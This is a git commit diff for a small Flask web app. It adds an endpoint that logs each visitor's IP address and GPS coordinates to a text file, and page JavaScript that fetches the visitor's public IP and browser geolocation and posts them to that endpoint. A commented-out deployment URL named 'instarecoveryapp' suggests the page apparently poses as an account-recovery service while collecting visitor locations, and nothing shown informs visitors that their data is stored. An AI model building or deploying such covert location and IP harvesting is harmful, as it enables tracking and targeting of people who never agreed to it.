39890ad3aa9cfa1fd73cc91354c27744acadd122
Lucas Sousa <lucasssousa10@gmail.com>
2020-05-21 23:19:29 -0300

    receive files

--- app/__init__.py
+++ app/__init__.py
@@ -1,4 +1,4 @@
-from flask import Flask
+from flask import Flask, request, jsonify
 from flask import render_template
 from flask_script import Manager
 from flask_cors import CORS
@@ -9,5 +9,16 @@ CORS(app)
 manager = Manager(app)
 
 @app.route('/')
-def hello_world():
+def initial_page():
     return render_template('home.html')
+
+@app.route('/receive', methods=['POST'])
+def receive_data():
+    data = request.get_json()
+
+    fo= open("results.txt", "a")
+    filebuffer = ["X: {}, Y: {}, IP: {}\n".format(data['x_coord'], data['y_coord'], data['ip'])]
+    fo.writelines(filebuffer)
+    fo.close()
+    
+    return jsonify({"success": True})
--- app/static/script.js
+++ app/static/script.js
@@ -1,13 +1,47 @@
 $(function() {
-    if (navigator.geolocation) 
-    {
-        navigator.geolocation.getCurrentPosition((position) => 
-        {
-            let coordenadas = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
-            console.log(coordenadas);
-            $("#coords").prop('innerHTML', coordenadas);
-        });
-    } else {
-        $("#coords").prop('innerHTML', "Geolocation is not supported by this browser.");
-    }
+    $.getJSON("https://api.ipify.org/?format=json",
+        function(json) {
+            $("#meu-ip").prop("innerHTML", "IP: " + json.ip);
+
+            let ip = json.ip;
+            let x_coord = null;
+            let y_coord = null;
+
+            if (navigator.geolocation) 
+            {
+                navigator.geolocation.getCurrentPosition((position) => 
+                {
+                    let coordenadas = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
+                    console.log(coordenadas);
+                    $("#coords").prop('innerHTML', coordenadas);
+
+                    x_coord = position.coords.latitude;
+                    y_coord = position.coords.longitude;
+
+                    $.ajax({
+                        //url: "https://instarecoveryapp.herokuapp.com/receive",
+                        url: "http://localhost:5000/receive",
+                        contentType: "application/json",
+                        data: "{ \"ip\": \""+ip+"\", \"x_coord\": \""+x_coord+"\", \"y_coord\": \""+y_coord+"\" }",
+                        method: "POST"
+                    }).done(function(res) {
+                        console.log(res);
+                    })
+                });
+
+            } else {
+                $.ajax({
+                    //url: "https://instarecoveryapp.herokuapp.com/receive",
+                    url: "http://localhost:5000/receive",
+                    contentType: "application/json",
+                    data: "{ \"ip\": \""+ip+"\", \"x_coord\": \""+x_coord+"\", \"y_coord\": \""+y_coord+"\" }",
+                    method: "POST"
+                }).done(function(res) {
+                    console.log(res);
+                })
+
+                $("#coords").prop('innerHTML', "Geolocation is not supported by this browser.");
+            }
+        }
+    );
 });
